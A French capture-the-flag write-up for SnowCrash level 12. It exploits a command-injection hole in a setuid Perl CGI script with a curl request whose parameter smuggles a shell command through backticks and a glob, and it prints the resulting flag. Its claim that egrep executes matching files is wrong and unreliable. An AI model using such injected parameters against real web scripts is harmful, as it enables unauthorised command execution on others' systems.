# LEVEL 12

- The usual beginning:
```
level12@SnowCrash:~$ ls -l
total 4
-rwsr-sr-x+ 1 flag12 level12 464 Mar  5  2016 level12.pl
```
Il s'agit a nouveau d'un programme `perl` qui contient la chose suivante: \
` cat level12.pl` :
```perl
#!/usr/bin/env perl

use CGI qw{param};
print "Content-type: text/html\n\n";

sub t {
  $nn = $_[1];
  $xx = $_[0];
  $xx =~ tr/a-z/A-Z/;
  $xx =~ s/\s.*//;
  @output = `egrep "^$xx" /tmp/xd 2>&1`;
  foreach $line (@output) {
      ($f, $s) = split(/:/, $line);
      if($s =~ $nn) {
          return 1;
      }
  }
  return 0;
}

sub n {
  if($_[0] == 1) {
      print("..");
  } else {
      print(".");
  }
}

n(t(param("x"), param("y")));
```

- Ce programme utilise la commande [egrep](https://www.geeksforgeeks.org/egrep-command-in-linux-with-examples/) qui cherche un pattern regex dans un fichier et l'execute s'il match ce pattern
- Egrep execute un fichier dont le nom match le pattern `$xx` (ici **en majuscule, sans espace**) \

- On glisse donc la commande `getflag` dans un fichier qui suit ce pattern pour pouvoir `egrep` dessus:

on creer un fichier en lettres majuscules 'HAKERMAN.SH' et '/*/HAKERMAN.sh' pour que '/tmp/HAKERMAN.SH' soit convertit en  '/TMP/HAKERMAN.SH'

```
echo "getflag > /tmp/myprecious" > /tmp/HAKERMAN.SH
chmod +x /tmp/HAKERMAN.SH
curl '127.0.0.1:4646?x="`/*/HAKERMAN.SH`"'
cat /tmp/myprecious
Check flag.Here is your token : g1qKMiRpXf53AWhDaU7FEkczr
```

## ⚡ Flag
`g1qKMiRpXf53AWhDaU7FEkczr`
